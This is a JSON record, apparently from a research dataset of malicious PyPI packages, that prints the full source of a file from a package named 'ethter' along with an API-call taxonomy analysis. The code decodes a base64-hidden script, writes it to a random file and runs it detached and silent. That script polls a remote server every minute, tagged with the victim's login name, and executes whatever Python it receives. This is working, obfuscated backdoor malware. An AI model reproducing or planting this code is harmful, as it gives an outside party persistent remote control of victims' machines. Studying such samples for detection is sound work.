[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ethter-1.10.1b1/ethter-1.10.1b1/ethter/utils/based.py",
    "code_snippet": "import base64\nimport sys\nimport os\nimport subprocess\nimport random\nimport string\nimport platform\n\ndef get_random_string(length):\n    letters = string.ascii_lowercase\n    result_str = ''.join(random.choice(letters) for i in range(length))\n    return result_str\n\nstruri = platform.system()[0] + os.getlogin() + '_' + get_random_string(6)\nstrsfx = \"/\"\nif platform.system()[0] == 'W':\n    strsfx = '\\\\'\npypathstr = sys.executable\nstrb = ''\npyexecstr = ''\nstrstraddr = 'DQppbXBvcnQgYmFzZTY0DQppbXBvcnQgdXJsbGliLnJlcXVlc3QNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHRlbXBmaWxlDQppbXBvcnQgc3lzDQppbXBvcnQgb3MNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHN0cmluZw0KDQpweXBhdGhzdHIgPSBzeXMuZXhlY3V0YWJsZQ0KYmluZXhpdCA9IDANCnNhbXBsZV9zdHJpbmcgPSAnJw0Kc3Ryc3RyYWRyID0naHR0cHM6Ly9ldGhlcnRlc3RuZXQucHJvL3BhcGVycGluMzkwMi5qcGcnDQpzdHJiID0gJycNCnN0cnAgPSAnJw0KZGVsYXlJblNlY29uZHMgPSA2MA0KcHlleGVjc3RyID0gJycNCg0KZGVmIGdldF9yYW5kb21fc3RyaW5nKGxlbmd0aCk6DQogICAgIyBjaG9vc2UgZnJvbSBhbGwgbG93ZXJjYXNlIGxldHRlcg0KICAgIGxldHRlcnMgPSBzdHJpbmcuYXNjaWlfbG93ZXJjYXNlDQogICAgcmVzdWx0X3N0ciA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShsZXR0ZXJzKSBmb3IgaSBpbiByYW5nZShsZW5ndGgpKQ0KICAgIHJldHVybiByZXN1bHRfc3RyDQogICAgDQp3aGlsZSBiaW5leGl0ID09IDA6DQoJcHlleGVjc3RyID0gJycNCglzdHJiID0gJycNCgltbWtiID0gJycNCglzdHJwID0gJycNCgltbWtwID0gJycNCgl0cnk6DQoJCXggPSByZXF1ZXN0cy5nZXQoc3Ryc3RyYWRyLCBoZWFkZXJzPXsnQ2FjaGUtQ29udHJvbCc6ICduby1jYWNoZScsICJQcmFnbWEiOiAibm8tY2FjaGUifSkNCgkJYmFzZTY0X3N0cmluZyA9IHgudGV4dA0KCQlzZm09YmFzZTY0X3N0cmluZy5maW5kKCJ8IikNCgkJaWYgc2ZtID4gMDoNCgkJCW1ta3A9YmFzZTY0X3N0cmluZ1swOnNmbV0NCgkJCW1ta2I9YmFzZTY0X3N0cmluZ1tzZm0rMTpsZW4oYmFzZTY0X3N0cmluZyldDQoJCWVsc2U6DQoJCQltbWtiID0gYmFzZTY0X3N0cmluZw0KDQoJCWlmIGxlbihtbWtwKSA+IDA6DQoJCQliYXNlNjRfYnl0ZXMgPSBtbWtwLmVuY29kZSgiYXNjaWkiKQ0KCQkJc2FtcGxlX3N0cmluZ19ieXRlcyA9IGJhc2U2NC5iNjRkZWNvZGUoYmFzZTY0X2J5dGVzKQ0KCQkJc3RycCA9IHNhbXBsZV9zdHJpbmdfYnl0ZXMuZGVjb2RlKCJhc2NpaSIpDQoNCgkJaWYgbGVuKG1ta2IpID4gMDoNCgkJCWJhc2U2NF9ieXRlcyA9IG1ta2IuZW5jb2RlKCJhc2NpaSIpDQoJCQlzYW1wbGVfc3RyaW5nX2J5dGVzID0gYmFzZTY0LmI2NGRlY29kZShiYXNlNjRfYnl0ZXMpDQoJCQlzdHJiID0gc2FtcGxlX3N0cmluZ19ieXRlcy5kZWNvZGUoImFzY2lpIikNCglleGNlcHQ6DQoJCXBhc3MNCglpZiBsZW4oc3RyYikgPiAwOg0KCQl0cnk6DQoJCQlleGVjKHN0cmIpDQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCgkJCXBhc3MJDQoJDQoJdGltZS5zbGVlcChkZWxheUluU2Vjb25kcyk='\n\nif len(strstraddr) > 0:\n    base64_bytes = strstraddr.encode(\"ascii\")\n    sample_string_bytes = base64.b64decode(base64_bytes)\n    newstrb = sample_string_bytes.decode(\"ascii\")\n\nstrb = newstrb.replace(\"paperpin3902\", struri)\n\nif len(strb) > 0:\n    try:\n        pyexecstr = os.getcwd() + strsfx + get_random_string(8) + \".py\"\n        f = open(pyexecstr, \"w\")\n        f.write(strb)\n        f.close()\n    except:\n        pass\n\nif len(pyexecstr) > 0:\n    if platform.system()[0] == 'W':\n        pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) \n    else:\n        subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "os.getlogin",
        "sys.executable",
        "get_random_string",
        "platform.system",
        "sys.executable",
        "os.getcwd",
        "get_random_string",
        "open",
        "open.write",
        "open.close",
        "platform.system",
        "subprocess.Popen",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "os.getlogin()",
        "sys.executable",
        "get_random_string(6)",
        "platform.system()",
        "sys.executable",
        "os.getcwd()",
        "get_random_string(8)",
        "open(pyexecstr, \"w\")",
        "f.write(strb)",
        "f.close()",
        "platform.system()",
        "subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL)",
        "subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "sys.executable",
          "id": "get_python_version",
          "description": "Retrieves Python interpreter version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "get_random_string",
          "id": "N/A",
          "description": "No matching sensitive API in taxonomy",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "sys.executable",
          "id": "get_python_version",
          "description": "Retrieves Python interpreter version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "get_random_string",
          "id": "N/A",
          "description": "No matching sensitive API in taxonomy",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_window",
          "description": "Spawns new process to execute command without shell window",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        }
      ],
      "contextual_code": "import base64\nimport sys\nimport os\nimport subprocess\nimport random\nimport string\nimport platform\n\ndef get_random_string(length):\n    letters = string.ascii_lowercase\n    result_str = ''.join(random.choice(letters) for i in range(length))\n    return result_str\n\nstruri = platform.system()[0] + os.getlogin() + '_' + get_random_string(6)\nstrsfx = \"/\"\nif platform.system()[0] == 'W':\n    strsfx = '\\\\'\npypathstr = sys.executable\n\n# ... (irrelevant code omitted)\n\nif len(strstraddr) > 0:\n    base64_bytes = strstraddr.encode(\"ascii\")\n    sample_string_bytes = base64.b64decode(base64_bytes)\n    newstrb = sample_string_bytes.decode(\"ascii\")\n\nstrb = newstrb.replace(\"paperpin3902\", struri)\n\nif len(strb) > 0:\n    try:\n        pyexecstr = os.getcwd() + strsfx + get_random_string(8) + \".py\"\n        f = open(pyexecstr, \"w\")\n        f.write(strb)\n        f.close()\n    except:\n        pass\n\nif len(pyexecstr) > 0:\n    if platform.system()[0] == 'W':\n        pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) \n    else:\n        subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)"
    }
  }
]